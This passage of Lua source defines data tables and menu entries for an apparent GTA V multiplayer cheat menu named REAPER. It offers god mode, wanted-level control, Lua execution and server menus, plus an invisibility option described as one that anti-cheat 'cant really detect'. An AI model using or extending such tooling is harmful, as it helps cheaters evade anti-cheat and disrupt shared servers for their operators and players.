    __REAPER1__.T.Float2 = {0.0, 0.01, 0.02, 0.03, 0.04, 0.05, 0.06, 0.07, 0.08, 0.09, 0.10, 0.11, 0.12, 0.13, 0.14, 0.15, 0.16, 0.17, 0.18, 0.19, 0.20, 0.21, 0.22, 0.23, 0.24, 0.25, 0.26, 0.27, 0.28, 0.29, 0.30, 0.31, 0.32, 0.33, 0.34, 0.35, 0.36, 0.37, 0.38, 0.39, 0.40, 0.41, 0.42, 0.43, 0.44, 0.45, 0.46, 0.47, 0.48, 0.49, 0.50, 0.51, 0.52, 0.53, 0.54, 0.55, 0.56, 0.57, 0.58, 0.59, 0.60, 0.61, 0.62, 0.63, 0.64, 0.65, 0.66, 0.67, 0.68, 0.69, 0.70, 0.71, 0.72, 0.73, 0.74, 0.75, 0.76, 0.77, 0.78, 0.79, 0.80, 0.81, 0.82, 0.83, 0.84, 0.85, 0.86, 0.87, 0.88, 0.89, 0.90, 0.91, 0.92, 0.93, 0.94, 0.95, 0.96, 0.97, 0.98, 0.99, 1.0}
    __REAPER1__.T.KeyIndexes = {}
    __REAPER1__.T.Keys = {'ESC','F1','F2','F3','F5','F6','F7','F8','F9','F10','F11','`','1','2','3','4','5','6','7','8','9','-','=','BSPACE','TAB','Q','W','E','R','T','Y','U','P','',']','ENTER','CAPS','A','S','D','F','G','H','K','L','LTSHIFT','Z','X','C','V','B','N','M',',','.','LTCTRL','LTALT','SPACE','RCTRL','HOME','PAGEUP','PAGEDOWN','DELETE','LEFT','RIGHT','TOP','UP','DOWN','NENTER','N4','N5','N6','N+','N-','N7','N8','N9','MOUSE1'}
    __REAPER1__.T.Float = {0.000, 0.001, 0.002, 0.003, 0.004, 0.005, 0.006, 0.007, 0.008, 0.009, 0.010 ,0.011 ,0.012 ,0.013 ,0.014 ,0.015 ,0.016 ,0.017 ,0.018 ,0.019 ,0.020 ,0.021 ,0.022 ,0.023 ,0.024 ,0.025 ,0.026 ,0.027 ,0.028 ,0.029 ,0.030 ,0.031 ,0.032 ,0.033 ,0.034 ,0.035 ,0.036 ,0.037 ,0.038 ,0.039 ,0.040 ,0.041 ,0.042 ,0.043 ,0.044 ,0.045 ,0.046 ,0.047 ,0.048 ,0.049 ,0.050 ,0.051 ,0.052 ,0.053 ,0.054 ,0.055 ,0.056 ,0.057 ,0.058 ,0.059 ,0.060 ,0.061 ,0.062 ,0.063 ,0.064 ,0.065 ,0.066 ,0.067 ,0.068 ,0.069 ,0.070 ,0.071 ,0.072 ,0.073 ,0.074 ,0.075 ,0.076 ,0.077 ,0.078 ,0.079 ,0.080 ,0.081 ,0.082 ,0.083 ,0.084 ,0.085 ,0.086 ,0.087 ,0.088 ,0.089 ,0.090 ,0.091 ,0.092 ,0.093 ,0.094 ,0.095 ,0.096 ,0.097 ,0.098 ,0.099, 0.1, 0.101, 0.102, 0.103, 0.104, 0.105, 0.106, 0.107, 0.108, 0.109, 0.110 ,0.111 ,0.112 ,0.113 ,0.114 ,0.115 ,0.116 ,0.117 ,0.118 ,0.119 ,0.120 ,0.121 ,0.122 ,0.123 ,0.124 ,0.125 ,0.126 ,0.127 ,0.128 ,0.129 ,0.130 ,0.131 ,0.132 ,0.133 ,0.134 ,0.135 ,0.136 ,0.137 ,0.138 ,0.139 ,0.140 ,0.141 ,0.142 ,0.143 ,0.144 ,0.145 ,0.146 ,0.147 ,0.148 ,0.149 ,0.150 ,0.151 ,0.152 ,0.153 ,0.154 ,0.155 ,0.156 ,0.157 ,0.158 ,0.159 ,0.160 ,0.161 ,0.162 ,0.163 ,0.164 ,0.165 ,0.166 ,0.167 ,0.168 ,0.169 ,0.170 ,0.171 ,0.172 ,0.173 ,0.174 ,0.175 ,0.176 ,0.177 ,0.178 ,0.179 ,0.180 ,0.181 ,0.182 ,0.183 ,0.184 ,0.185 ,0.186 ,0.187 ,0.188 ,0.189 ,0.190 ,0.191 ,0.192 ,0.193 ,0.194 ,0.195 ,0.196 ,0.197 ,0.198 ,0.199,0.2, 0.201, 0.202, 0.203, 0.204, 0.205, 0.206, 0.207, 0.208, 0.209, 0.210 ,0.211 ,0.212 ,0.213 ,0.214 ,0.215 ,0.216 ,0.217 ,0.218 ,0.219 ,0.220 ,0.221 ,0.222 ,0.223 ,0.224 ,0.225 ,0.226 ,0.227 ,0.228 ,0.229 ,0.230 ,0.231 ,0.232 ,0.233 ,0.234 ,0.235 ,0.236 ,0.237 ,0.238 ,0.239 ,0.240 ,0.241 ,0.242 ,0.243 ,0.244 ,0.245 ,0.246 ,0.247 ,0.248 ,0.249 ,0.250 ,0.251 ,0.252 ,0.253 ,0.254 ,0.255 ,0.256 ,0.257 ,0.258 ,0.259 ,0.260 ,0.261 ,0.262 ,0.263 ,0.264 ,0.265 ,0.266 ,0.267 ,0.268 ,0.269 ,0.270 ,0.271 ,0.272 ,0.273 ,0.274 ,0.275 ,0.276 ,0.277 ,0.278 ,0.279 ,0.280 ,0.281 ,0.282 ,0.283 ,0.284 ,0.285 ,0.286 ,0.287 ,0.288 ,0.289 ,0.290 ,0.291 ,0.292 ,0.293 ,0.294 ,0.295 ,0.296 ,0.297 ,0.298 ,0.299,0.3, 0.301, 0.302, 0.303, 0.304, 0.305, 0.306, 0.307, 0.308, 0.309, 0.310 ,0.311 ,0.312 ,0.313 ,0.314 ,0.315 ,0.316 ,0.317 ,0.318 ,0.319 ,0.320 ,0.321 ,0.322 ,0.323 ,0.324 ,0.325 ,0.326 ,0.327 ,0.328 ,0.329 ,0.330 ,0.331 ,0.332 ,0.333 ,0.334 ,0.335 ,0.336 ,0.337 ,0.338 ,0.339 ,0.340 ,0.341 ,0.342 ,0.343 ,0.344 ,0.345 ,0.346 ,0.347 ,0.348 ,0.349 ,0.350 ,0.351 ,0.352 ,0.353 ,0.354 ,0.355 ,0.356 ,0.357 ,0.358 ,0.359 ,0.360 ,0.361 ,0.362 ,0.363 ,0.364 ,0.365 ,0.366 ,0.367 ,0.368 ,0.369 ,0.370 ,0.371 ,0.372 ,0.373 ,0.374 ,0.375 ,0.376 ,0.377 ,0.378 ,0.379 ,0.380 ,0.381 ,0.382 ,0.383 ,0.384 ,0.385 ,0.386 ,0.387 ,0.388 ,0.389 ,0.390 ,0.391 ,0.392 ,0.393 ,0.394 ,0.395 ,0.396 ,0.397 ,0.398 ,0.399,0.4, 0.401, 0.402, 0.403, 0.404, 0.405, 0.406, 0.407, 0.408, 0.409, 0.410 ,0.411 ,0.412 ,0.413 ,0.414 ,0.415 ,0.416 ,0.417 ,0.418 ,0.419 ,0.420 ,0.421 ,0.422 ,0.423 ,0.424 ,0.425 ,0.426 ,0.427 ,0.428 ,0.429 ,0.430 ,0.431 ,0.432 ,0.433 ,0.434 ,0.435 ,0.436 ,0.437 ,0.438 ,0.439 ,0.440 ,0.441 ,0.442 ,0.443 ,0.444 ,0.445 ,0.446 ,0.447 ,0.448 ,0.449 ,0.450 ,0.451 ,0.452 ,0.453 ,0.454 ,0.455 ,0.456 ,0.457 ,0.458 ,0.459 ,0.460 ,0.461 ,0.462 ,0.463 ,0.464 ,0.465 ,0.466 ,0.467 ,0.468 ,0.469 ,0.470 ,0.471 ,0.472 ,0.473 ,0.474 ,0.475 ,0.476 ,0.477 ,0.478 ,0.479 ,0.480 ,0.481 ,0.482 ,0.483 ,0.484 ,0.485 ,0.486 ,0.487 ,0.488 ,0.489 ,0.490 ,0.491 ,0.492 ,0.493 ,0.494 ,0.495 ,0.496 ,0.497 ,0.498 ,0.499,0.5, 0.501, 0.502, 0.503, 0.504, 0.505, 0.506, 0.507, 0.508, 0.509, 0.510 ,0.511 ,0.512 ,0.513 ,0.514 ,0.515 ,0.516 ,0.517 ,0.518 ,0.519 ,0.520 ,0.521 ,0.522 ,0.523 ,0.524 ,0.525 ,0.526 ,0.527 ,0.528 ,0.529 ,0.530 ,0.531 ,0.532 ,0.533 ,0.534 ,0.535 ,0.536 ,0.537 ,0.538 ,0.539 ,0.540 ,0.541 ,0.542 ,0.543 ,0.544 ,0.545 ,0.546 ,0.547 ,0.548 ,0.549 ,0.550 ,0.551 ,0.552 ,0.553 ,0.554 ,0.555 ,0.556 ,0.557 ,0.558 ,0.559 ,0.560 ,0.561 ,0.562 ,0.563 ,0.564 ,0.565 ,0.566 ,0.567 ,0.568 ,0.569 ,0.570 ,0.571 ,0.572 ,0.573 ,0.574 ,0.575 ,0.576 ,0.577 ,0.578 ,0.579 ,0.580 ,0.581 ,0.582 ,0.583 ,0.584 ,0.585 ,0.586 ,0.587 ,0.588 ,0.589 ,0.590 ,0.591 ,0.592 ,0.593 ,0.594 ,0.595 ,0.596 ,0.597 ,0.598 ,0.599,0.6, 0.601, 0.602, 0.603, 0.604, 0.605, 0.606, 0.607, 0.608, 0.609, 0.610 ,0.611 ,0.612 ,0.613 ,0.614 ,0.615 ,0.616 ,0.617 ,0.618 ,0.619 ,0.620 ,0.621 ,0.622 ,0.623 ,0.624 ,0.625 ,0.626 ,0.627 ,0.628 ,0.629 ,0.630 ,0.631 ,0.632 ,0.633 ,0.634 ,0.635 ,0.636 ,0.637 ,0.638 ,0.639 ,0.640 ,0.641 ,0.642 ,0.643 ,0.644 ,0.645 ,0.646 ,0.647 ,0.648 ,0.649 ,0.650 ,0.651 ,0.652 ,0.653 ,0.654 ,0.655 ,0.656 ,0.657 ,0.658 ,0.659 ,0.660 ,0.661 ,0.662 ,0.663 ,0.664 ,0.665 ,0.666 ,0.667 ,0.668 ,0.669 ,0.670 ,0.671 ,0.672 ,0.673 ,0.674 ,0.675 ,0.676 ,0.677 ,0.678 ,0.679 ,0.680 ,0.681 ,0.682 ,0.683 ,0.684 ,0.685 ,0.686 ,0.687 ,0.688 ,0.689 ,0.690 ,0.691 ,0.692 ,0.693 ,0.694 ,0.695 ,0.696 ,0.697 ,0.698 ,0.699,0.7, 0.701, 0.702, 0.703, 0.704, 0.705, 0.706, 0.707, 0.708, 0.709, 0.710 ,0.711 ,0.712 ,0.713 ,0.714 ,0.715 ,0.716 ,0.717 ,0.718 ,0.719 ,0.720 ,0.721 ,0.722 ,0.723 ,0.724 ,0.725 ,0.726 ,0.727 ,0.728 ,0.729 ,0.730 ,0.731 ,0.732 ,0.733 ,0.734 ,0.735 ,0.736 ,0.737 ,0.738 ,0.739 ,0.740 ,0.741 ,0.742 ,0.743 ,0.744 ,0.745 ,0.746 ,0.747 ,0.748 ,0.749 ,0.750 ,0.751 ,0.752 ,0.753 ,0.754 ,0.755 ,0.756 ,0.757 ,0.758 ,0.759 ,0.760 ,0.761 ,0.762 ,0.763 ,0.764 ,0.765 ,0.766 ,0.767 ,0.768 ,0.769 ,0.770 ,0.771 ,0.772 ,0.773 ,0.774 ,0.775 ,0.776 ,0.777 ,0.778 ,0.779 ,0.780 ,0.781 ,0.782 ,0.783 ,0.784 ,0.785 ,0.786 ,0.787 ,0.788 ,0.789 ,0.790 ,0.791 ,0.792 ,0.793 ,0.794 ,0.795 ,0.796 ,0.797 ,0.798 ,0.799,0.8, 0.801, 0.802, 0.803, 0.804, 0.805, 0.806, 0.807, 0.808, 0.809, 0.810 ,0.811 ,0.812 ,0.813 ,0.814 ,0.815 ,0.816 ,0.817 ,0.818 ,0.819 ,0.820 ,0.821 ,0.822 ,0.823 ,0.824 ,0.825 ,0.826 ,0.827 ,0.828 ,0.829 ,0.830 ,0.831 ,0.832 ,0.833 ,0.834 ,0.835 ,0.836 ,0.837 ,0.838 ,0.839 ,0.840 ,0.841 ,0.842 ,0.843 ,0.844 ,0.845 ,0.846 ,0.847 ,0.848 ,0.849 ,0.850 ,0.851 ,0.852 ,0.853 ,0.854 ,0.855 ,0.856 ,0.857 ,0.858 ,0.859 ,0.860 ,0.861 ,0.862 ,0.863 ,0.864 ,0.865 ,0.866 ,0.867 ,0.868 ,0.869 ,0.870 ,0.871 ,0.872 ,0.873 ,0.874 ,0.875 ,0.876 ,0.877 ,0.878 ,0.879 ,0.880 ,0.881 ,0.882 ,0.883 ,0.884 ,0.885 ,0.886 ,0.887 ,0.888 ,0.889 ,0.890 ,0.891 ,0.892 ,0.893 ,0.894 ,0.895 ,0.896 ,0.897 ,0.898 ,0.899,0.9, 0.901, 0.902, 0.903, 0.904, 0.905, 0.906, 0.907, 0.908, 0.909, 0.910 ,0.911 ,0.912 ,0.913 ,0.914 ,0.915 ,0.916 ,0.917 ,0.918 ,0.919 ,0.920 ,0.921 ,0.922 ,0.923 ,0.924 ,0.925 ,0.926 ,0.927 ,0.928 ,0.929 ,0.930 ,0.931 ,0.932 ,0.933 ,0.934 ,0.935 ,0.936 ,0.937 ,0.938 ,0.939 ,0.940 ,0.941 ,0.942 ,0.943 ,0.944 ,0.945 ,0.946 ,0.947 ,0.948 ,0.949 ,0.950 ,0.951 ,0.952 ,0.953 ,0.954 ,0.955 ,0.956 ,0.957 ,0.958 ,0.959 ,0.960 ,0.961 ,0.962 ,0.963 ,0.964 ,0.965 ,0.966 ,0.967 ,0.968 ,0.969 ,0.970 ,0.971 ,0.972 ,0.973 ,0.974 ,0.975 ,0.976 ,0.977 ,0.978 ,0.979 ,0.980 ,0.981 ,0.982 ,0.983 ,0.984 ,0.985 ,0.986 ,0.987 ,0.988 ,0.989 ,0.990 ,0.991 ,0.992 ,0.993 ,0.994 ,0.995 ,0.996 ,0.997 ,0.998 ,0.999}
    __REAPER1__.T.Explosions = {'Grenade', 'Grenadelauncher', 'Stickybomb', 'Molotov', 'Rocket', 'Tankshell', 'Hi Octane', 'Car', 'Plane', 'Petrol Pump', 'Bike', 'Steam', 'Flame', 'Water Hydrant', 'Gas Canister', 'Boat', 'Ship Destroy', 'Truck', 'Bullet', 'Smoke Grenadelauncher', 'Smoke Grenade', 'Bzgas', 'Flare', 'Gas Canister', 'Extinguisher', 'Programmablear', 'Train', 'Barrel', 'Propane', 'Blimp', 'Flame Explode', 'Tanker', 'Plane Rocket', 'Vehicle Bullet', 'Gas Tank'}
    __REAPER1__.T.Weapons = {"Unarmed", "Knife", "Dagger", "Switchblade", "Hatchet", "Battleaxe", "Stone_Hatchet", "Machete", "Bat", "Golfclub", "Poolcue", "Nightstick", "Crowbar", "Wrench", "Hammer", "Flashlight", "Knuckle", "Bottle", "Pistol", "Pistol_MK2", "Combatpistol", "Appistol", "Stungun", "Pistol50", "Snspistol", "Snspistol_MK2", "Heavypistol", "Vintagepistol", "Flaregun", "Marksmanpistol", "Revolver", "Revolver_MK2", "Doubleaction", "Raypistol", "Ceramicpistol", "Navyrevolver", "Microsmg", "Smg", "Smg_MK2", "Assaultsmg", "Combatpdw", "Machinepistol", "Minismg", "Raycarbine", "Pumpshotgun", "Pumpshotgun_MK2", "Sawnoffshotgun", "Assaultshotgun", "Bullpupshotgun", "Musket", "Heavyshotgun", "Dbshotgun", "Autoshotgun", "Assaultrifle", "Assaultrifle_MK2", "Carbinerifle", "Carbinerifle_MK2", "Advancedrifle", "Specialcarbine", "Specialcarbine_MK2", "Bullpuprifle", "Bullpuprifle_MK2", "Compactrifle", "Mg", "Combatmg", "Combatmg_MK2", "Gusenberg", "Sniperrifle", "Heavysniper", "Heavysniper_MK2", "Marksmanrifle", "Marksmanrifle_MK2", "RPG", "Grenadelauncher", "Minigun", "Firework", "Railgun", "Hominglauncher", "Compactlauncher", "Rayminigun", "Grenade", "Bzgas", "Molotov", "Stickybomb", "Proxmine", "Snowball", "Pipebomb", "Ball", "Smokegrenade", "Flare", "Petrolcan", "Parachute", "Fireextinguisher"}
    __REAPER1__.T.Szazas = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100}
    __REAPER1__.T.EzresNullaval = {}
    __REAPER1__.T.Ezres = {}
    __REAPER1__.T.Tizezres = {}
    __REAPER1__.T.Display = {
        ['zero'] = {
            {text = 'Home', dkey = 'home', func = {'home', 'home'}, lasto = 1, scrollo = 0, addedo = 0}
        },

        ['home'] = {
            {text = 'Player', dkey = 'player', desc = 'Player menu.', option = __REAPER1__.M.Menu_Button, func = {'home', 'player'}, lasto = 1, scrollo = 0, addedo = 0},
            {text = 'Weapons', dkey = 'weapon', desc = 'Weapons menu.', option = __REAPER1__.M.Menu_Button, func = {'home', 'weapon'}, lasto = 1, scrollo = 0, addedo = 0},
            {text = 'Combat', dkey = 'combat', desc = 'Combat menu.', option = __REAPER1__.M.Menu_Button, func = {'home', 'combat'}, lasto = 1, scrollo = 0, addedo = 0},
            {text = 'Vehicle', dkey = 'vehicle', desc = 'Vehicle menu.', option = __REAPER1__.M.Menu_Button, func = {'home', 'vehicle'}, lasto = 1, scrollo = 0, addedo = 0},
            {text = 'Server', dkey = 'server', desc = 'Server menu.', option = __REAPER1__.M.Menu_Button, func = {'home', 'server'}, lasto = 1, scrollo = 0, addedo = 0},
            {text = 'Scripts', dkey = 'scripts', desc = 'Scripts menu.', option = __REAPER1__.M.Menu_Button, func = {'home', 'scripts'}, lasto = 1, scrollo = 0, addedo = 0},
            {text = 'Visuals', dkey = 'visuals', desc = 'Visuals menu.', option = __REAPER1__.M.Menu_Button, func = {'home', 'visuals'}, lasto = 1, scrollo = 0, addedo = 0},
            {text = 'Spawning', dkey = 'spawning', desc = 'Spawning menu.', option = __REAPER1__.M.Menu_Button, func = {'home', 'spawning'}, lasto = 1, scrollo = 0, addedo = 0},
            {text = 'Teleport', dkey = 'teleport', desc = 'Teleport menu.', option = __REAPER1__.M.Menu_Button, func = {'home', 'teleport'}, lasto = 1, scrollo = 0, addedo = 0},
            {text = 'Miscellaneous', dkey = 'misc', desc = 'Miscellaneous menu.', option = __REAPER1__.M.Menu_Button, func = {'home', 'misc'}, lasto = 1, scrollo = 0, addedo = 0},
            {text = 'World', dkey = 'world', desc = 'World menu.', option = __REAPER1__.M.Menu_Button, func = {'home', 'world'}, lasto = 1, scrollo = 0, addedo = 0},
            {text = 'Execution', dkey = 'luaexec', desc = 'Execution menu.', option = __REAPER1__.M.Menu_Button, func = {'home', 'luaexec'}, lasto = 1, scrollo = 0, addedo = 0},
            {text = 'Settings', dkey = 'settings', desc = 'Settings menu.', option = __REAPER1__.M.Menu_Button, func = {'home', 'settings'}, lasto = 1, scrollo = 0, addedo = 0},
            {text = 'Search option', dkey = 'searchopt', desc = 'Search option menu.', option = __REAPER1__.M.Menu_Button, func = {'home', 'searchopt'}, lasto = 1, scrollo = 0, addedo = 0},
        },

        ['player'] = {
            {text = 'Movement', dkey = 'player:movement', desc = 'Movement menu.', option = __REAPER1__.M.Menu_Button, func = {'player', 'player:movement'}, lasto = 1, scrollo = 0, addedo = 0},
            {text = 'God mode', dkey = 'player:godmode', desc = 'God mode menu.', option = __REAPER1__.M.Menu_Button, func = {'player', 'player:godmode'}, lasto = 1, scrollo = 0, addedo = 0},
            {text = 'Skin', dkey = 'player:skin', desc = 'Skin menu.', option = __REAPER1__.M.Menu_Button, func = {'player', 'player:skin'}, lasto = 1, scrollo = 0, addedo = 0},
            {text = 'Super powers', dkey = 'player:superpower', desc = 'Super powers menu.', option = __REAPER1__.M.Menu_Button, func = {'player', 'player:superpower'}, lasto = 1, scrollo = 0, addedo = 0},
            {text = 'Model', dkey = 'player:model', desc = 'Model menu.', option = __REAPER1__.M.Menu_Button, func = {'player', 'player:model'}, lasto = 1, scrollo = 0, addedo = 0},
            {text = 'Force field', dkey = 'player:forcefield', desc = 'Force field menu.', option = __REAPER1__.M.Menu_Button, func = {'player', 'player:forcefield'}, lasto = 1, scrollo = 0, addedo = 0},
            {text = 'Vision', dkey = 'player:vision', desc = 'Vision menu.', option = __REAPER1__.M.Menu_Button, func = {'player', 'player:vision'}, lasto = 1, scrollo = 0, addedo = 0},
            {text = 'Animations', dkey = 'player:animation', desc = 'Animations menu.', option = __REAPER1__.M.Menu_Button, func = {'player', 'player:animation'}, lasto = 1, scrollo = 0, addedo = 0},
            {text = 'Particles', dkey = 'player:particle', desc = 'Particles menu.', option = __REAPER1__.M.Menu_Button, func = {'player', 'player:particle'}, lasto = 1, scrollo = 0, addedo = 0},
            {text = 'Stat editor', dkey = 'player:stateditor', desc = 'Stat editor menu.', option = __REAPER1__.M.Menu_Button, func = {'player', 'player:stateditor'}, lasto = 1, scrollo = 0, addedo = 0},
            {text = 'Player ped', option = __REAPER1__.M.Separator},
            {text = 'Max health', dkey = 'player_maxhealth', desc = 'Set your maximum health.', afu = __REAPER1__.M.player.maxhealth, option = __REAPER1__.M.Button_Textbox, textboxtext = 'Maximum health number', length = 20, tipus = 'szam', func = 0},
            {text = 'Max armour', dkey = 'player_maxarmour', desc = 'Set your maximum armour.', afu = __REAPER1__.M.player.maxarmour, option = __REAPER1__.M.Button_Textbox, textboxtext = 'Maximum armour number', length = 20, tipus = 'szam', func = 0},
            {text = 'Set health', dkey = 'player_sethealth', desc = 'Set your health.', afu = __REAPER1__.M.player.sethealth, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Health number', length = 100, tipus = 'szam', func = {0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200}},
            {text = 'Set armour', dkey = 'player_setarmour', desc = 'Set your armour.', afu = __REAPER1__.M.player.setarmour, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Armour number', length = 100, tipus = 'szam', func = __REAPER1__.T.Szazas},
            {text = 'Revive', dkey = 'player_revive', desc = 'Revive yourself.', afu = __REAPER1__.M.player.revive, option = __REAPER1__.M.Button},
            {text = 'Suicide', dkey = 'player_suicide', desc = 'Kill yourself.', afu = __REAPER1__.M.player.suicide, option = __REAPER1__.M.Button},
            {text = 'Fake death', dkey = 'player_fakedeath', desc = 'Force your server status to dead.', afu = __REAPER1__.M.player.fakedeath, option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Reset stamina', dkey = 'player_resetstamina', desc = 'Reset your stamina.', afu = __REAPER1__.M.player.resetstamina, option = __REAPER1__.M.Button},
            {text = 'Infinite stamina', dkey = 'player_infinitestamine', desc = 'Force infinite stamine.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'General', option = __REAPER1__.M.Separator},
            {text = 'Secure invisible', dkey = 'player_secureinvisible', desc = 'Be invisible in a way acs cant really detect.', afu = __REAPER1__.M.player.secinvisible, option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Invisibile', dkey = 'player_invisible', desc = 'Make yourself invisible.', afu = __REAPER1__.M.player.invisible, option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Alpha', dkey = 'player_alpha', desc = 'Set your alpha. Only on client', afu = __REAPER1__.M.player.alpha, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Ped alpha number', length = 3, tipus = 'vegyes', func = __REAPER1__.T.AlphaValues},
            {text = 'Ragdoll', dkey = 'player_ragdoll', desc = 'Ragdoll yourself.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Disable ragdoll', dkey = 'player_disableragdoll', desc = 'Disable getting ragdolled.', afu = __REAPER1__.M.player.disableragdoll, option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Freeze', dkey = 'player_freeze', desc = 'Freeze yourself.', afu = __REAPER1__.M.player.freeze, option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Disable headshot', dkey = 'player_disableheadshot', desc = 'Disable getting headshot.', afu = __REAPER1__.M.player.disableheadshot, option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Disable drowning', dkey = 'player_disabledrowning', desc = 'Disable drowning underwater.', afu = __REAPER1__.M.player.disabledrowning, option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Taze time', dkey = 'player_tazetime', desc = 'Set the time of how long you are tazed.\nEnter default to turn it off.', afu = __REAPER1__.M.player.tazetime, option = __REAPER1__.M.Button_Textbox, textboxtext = 'Taze time number', length = 10, tipus = 'vegyes', func = 'Default'},
            {text = 'Health recharge', dkey = 'player_healthrecharge', desc = 'Set your health regeneration rate.\nSet to default to turn it off.', afu = __REAPER1__.M.player.healthrecharge, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Health recharge number', length = 7, tipus = 'vegyes', func = {'Default', 0.0, 0.01, 0.02, 0.03, 0.04, 0.05, 0.06, 0.07, 0.08, 0.09, 0.10, 0.11, 0.12, 0.13, 0.14, 0.15, 0.16, 0.17, 0.18, 0.19, 0.20, 0.21, 0.22, 0.23, 0.24, 0.25, 0.26, 0.27, 0.28, 0.29, 0.30, 0.31, 0.32, 0.33, 0.34, 0.35, 0.36, 0.37, 0.38, 0.39, 0.40, 0.41, 0.42, 0.43, 0.44, 0.45, 0.46, 0.47, 0.48, 0.49, 0.50, 0.51, 0.52, 0.53, 0.54, 0.55, 0.56, 0.57, 0.58, 0.59, 0.60, 0.61, 0.62, 0.63, 0.64, 0.65, 0.66, 0.67, 0.68, 0.69, 0.70, 0.71, 0.72, 0.73, 0.74, 0.75, 0.76, 0.77, 0.78, 0.79, 0.80, 0.81, 0.82, 0.83, 0.84, 0.85, 0.86, 0.87, 0.88, 0.89, 0.90, 0.91, 0.92, 0.93, 0.94, 0.95, 0.96, 0.97, 0.98, 0.99, 1.0}},
            {text = 'Always friendly', dkey = 'player_alwaysfriendly', desc = 'Peds won\'t be able to target you.', afu = __REAPER1__.M.player.alwaysfriendly, option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Misc', option = __REAPER1__.M.Separator},
            {text = 'Clear tasks', dkey = 'player_cleartask', desc = 'Clear your current task.', afu = __REAPER1__.M.player.cleartasks, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Task to clear', length = 10, tipus = 'betu', func = {'Normal', 'Secondary', 'Immediately'}},
            {text = 'Max wanted level', dkey = 'player_maxwantedlevel', desc = 'Set the maximum wanted level you\ncan have.', afu = __REAPER1__.M.player.maxwantedlevel, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Wanted level', length = 1, tipus = 'szam', func = {5, 4, 3, 2, 1, 0}},
            {text = 'Clear wanted level', dkey = 'player_clearwantedlevel', desc = 'Clear your current wanted level.', afu = __REAPER1__.M.player.clearwantedlevel, option = __REAPER1__.M.Button},
            {text = 'Set wanted level', dkey = 'player_setwantedlevel', desc = 'Set your current wanted level.', afu = __REAPER1__.M.player.setwantedlevel, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Wanted level', length = 1, tipus = 'szam', func = {0, 1, 2, 3, 4, 5}},
            {text = 'Become a cop', dkey = 'player_becomeacop', desc = 'Force yourself to be a cop. Regular\npolicemen won\'t attack you.', afu = __REAPER1__.M.player.becomeacop, option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Friendly gangs', dkey = 'player_friendlygangs', desc = 'Be friendly with every gang. They\nwon\'t attack.', afu = __REAPER1__.M.player.friendlygangs, option = __REAPER1__.M.Checkbox, func = false},
        },

        ['player:movement'] = {
            {text = 'Auto movement', dkey = 'player:movement_automovement', desc = 'Automatically run around.', afu = __REAPER1__.M.player.movement.automovement, option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Infinite jumps', dkey = 'player:movement_infinitejumps', desc = 'Jump without a delay.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Super', option = __REAPER1__.M.Separator},
            {text = 'Run speed', dkey = 'player:movement_runspeed', desc = 'Override your run speed.', afu = __REAPER1__.M.player.movement.runspeed, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Run speed number', length = 4, tipus = 'szam', func = {1.0, 1.01, 1.02, 1.03, 1.04, 1.05, 1.06, 1.07, 1.08, 1.09, 1.1, 1.11, 1.12, 1.13, 1.14, 1.15, 1.16, 1.17, 1.18, 1.19, 1.2, 1.21, 1.22, 1.23, 1.24, 1.25, 1.26, 1.27, 1.28, 1.29, 1.3, 1.31, 1.32, 1.33, 1.34, 1.35, 1.36, 1.37, 1.38, 1.39, 1.4, 1.41, 1.42, 1.43, 1.44, 1.45, 1.46, 1.47, 1.48, 1.49}},
